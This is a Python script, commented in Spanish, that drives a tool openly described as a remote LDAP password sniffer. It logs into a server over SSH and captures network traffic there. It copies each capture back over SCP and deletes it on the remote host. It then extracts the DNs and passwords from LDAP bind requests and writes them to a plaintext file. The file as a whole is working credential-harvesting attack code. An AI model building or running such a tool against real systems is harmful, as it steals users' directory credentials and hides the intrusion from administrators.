#!/usr/bin/env python3

import argparse
from ssh import SSH
from paquetes import Trafico
from utils import *


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Remote LDAP password sniffer with SSH')

    # Flags de captura de trafico
    parser.add_argument('-i', '--interface', required=True, help='Remote network interface to listen', type=str)
    parser.add_argument('-f', '--filename', required=True, help='File name for the mixed traffic capture file', type=str)
    parser.add_argument('-p', '--port', required=False, help='Remote port to listen', type=int)
    parser.add_argument('-c', '--command', required=False, help=f'Listener command to use, availables: ({",".join(Trafico.listeners.keys())})', type=str)

    # Flags de SSH
    parser.add_argument('-s', '--server', required=True, help='Remote SSH server', type=str)
    parser.add_argument('-u', '--user', required=True, help='Remote SSH user (able to capture traffic in the LDAP port)', type=str)
    parser.add_argument('-pw', '--password', required=False, help='Remote SSH user password', type=str)
    parser.add_argument('-pk', '--pkfile', required=False, help='Private key file', type=str)
    parser.add_argument('-pkp', '--pkfilepw', required=False, help='Private key passphrase if needed', type=str)
    parser.add_argument('-sshp', '--ssh_port', required=False, default=22, help='SSH port to connect (default 22)', type=int)

    # Flag de output de informacion (IPs origen y destino, DN y contrasegna) en fichero de texto plano
    parser.add_argument('-o', '--output', required=False, help='Output file for info', type=str)

    # Flag de resolucion inversa DNS
    parser.add_argument('-n', required=False, help='Disable reverse DNS resolution', action='store_false')

    # Flag de verbose
    parser.add_argument('-v', required=False, help='Verbose. See the info captured during execution', action='store_true')

    # Argumentos parseados
    args = parser.parse_args()


    # Se verifica si el comando escuchador especificado esta soportado
    if args.command and args.command.lower() not in Trafico.listeners:
        soltar_error('Listener command specified not supported', 6)

    # Sockets de la conexion remota SSH para ejecutar comandos y transferir archivos
    ssh, scp = SSH.conectarse_a_host(args)

    # Se verifica si la interfaz de red que ha especificado el usuario existe o no en el servidor remoto
    SSH.verificar_interfaz_red_remota(ssh, args)

    # Variables auxiliares
    primero = True
    seguir = True
    nombre_temporal = f'{args.filename}_temp'
    dict_dns = {}
    writer_output = None

    # Se ha especificado un fichero de salida de informacion
    if args.output:
        writer_output = open(args.output, 'w', encoding='utf-8', buffering=1)


    # Comando de captura a ejecutar remotamente
    comando = SSH.comando_remoto(ssh, args, Trafico.listeners)

    soltar_error(comando, 0)

    # Se inicia la primera captura
    pid_remoto = SSH.iniciar_captura(ssh, comando)

    # Bucle infinito de ejecucion
    while True:
        try:
            # Espera a que el usuario seleccione una opcion
            opcion = recoger_opcion(primero)

            # En cuanto el usuario elige una opcion, se detiene la captura de trafico remota
            SSH.parar_captura(ssh, pid_remoto)

            # Se toma la captura de trafico remota y se borra en el servidor remoto
            SSH.recoger_y_borrar_captura(ssh, scp, args)

            # Convertir la captura recogida a formato pcap si es necesario
            Trafico.convertir_si_necesario(nombre_temporal)


            # Detener captura e iniciar otra
            if opcion == 0:
                pid_remoto = SSH.iniciar_captura(ssh, comando)

            # Detener captura y salir del bucle
            else:
                seguir = False


            # Es la primera vez que se detiene una captura
            if primero:
                primero = False
                # Filtrar trafico LDAP bindRequests de la primera captura y sobreescribirla
                Trafico.filtrar_ldap_primera_captura(args.filename, writer_output, dict_dns, args.n, args.v)

            # No es la primera captura que se detiene
            else:
                # Se filtra el trafico LDAP bindRequests de la captura remota recogida y se une a las ya existentes en una sola
                Trafico.unir_dos_capturas(args.filename, nombre_temporal, writer_output, dict_dns, args.n, args.v)


            # Detener la captura y terminar la ejecucion
            if not seguir:
                break


        # Detener ejecucion si ocurre cualquier excepcion no esperada
        except:
            SSH.parar_captura(ssh, pid_remoto)
            scp.close()
            ssh.close()
            soltar_error('Unexpected exception', 4)

    # Cerrar el fichero de salida de informacion si se ha especificado
    if args.output:
        writer_output.close()

    # Cerrar conexiones SSH y SFTP
    scp.close()
    ssh.close()
